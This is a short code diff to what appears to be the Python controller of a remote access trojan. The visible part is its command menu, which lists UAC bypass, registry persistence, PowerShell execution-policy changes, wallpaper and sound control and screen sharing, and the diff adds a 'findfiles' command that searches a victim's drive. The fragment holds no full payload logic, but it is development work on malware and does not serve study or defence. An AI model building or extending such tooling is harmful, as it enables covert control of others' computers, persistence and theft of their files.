@@ -310,6 +310,7 @@ def target_communication(target, ip):
                     changepolicy                       --> execute powershell scripts
                     cwallpaper                         --> change wallpaper
                     bypass-uac                         --> try to bypass uac
+                    findfiles                          --> example findfiles|txt|C:\\
                     playsound                          --> play wav file in the background (just .wav)
                     persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
@@ -362,7 +363,7 @@ def target_communication(target, ip):
                         print("[-] Failed Uploading The File")
                     else:
                         print("[+] Wav File Started")
-                    
+
             else:
                 result = reliable_recv(target)
                 print(result)
